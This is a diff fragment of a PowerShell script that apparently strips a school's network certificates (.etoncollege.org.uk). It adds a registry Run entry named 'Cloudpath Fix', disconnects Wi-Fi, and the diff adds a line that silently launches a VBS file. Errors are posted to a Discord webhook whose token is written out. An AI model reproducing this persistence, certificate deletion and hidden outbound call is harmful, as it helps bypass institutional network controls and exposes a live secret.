@@ -13,6 +13,7 @@ reg ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Cloudpath Fix" /t
 cd Cert:\CurrentUser\My
 gci|?{$_.Subject.Contains(".etoncollege.org.uk")}|%{certutil.exe -delstore -user My ($_.Thumbprint)}
 netsh wlan disconnect
+C:\Windows\System32\wscript.exe C:\ProgramData\cloudpath_data\fix.vbs
 }
 catch {
     iwr -useb -Headers @{Accept='application/json';'Content-Type'='application/json'} -Method 'POST' -Body (ConvertTo-Json @{content='ERROR: '+$_}) https://discord.com/api/webhooks/1104701170624241766/TJ-AHScxciwD3lTYzaEPXgeSufZQxGPEUakE4yYebKXBhbBtq_XBZkkf7FQn86pAerXr
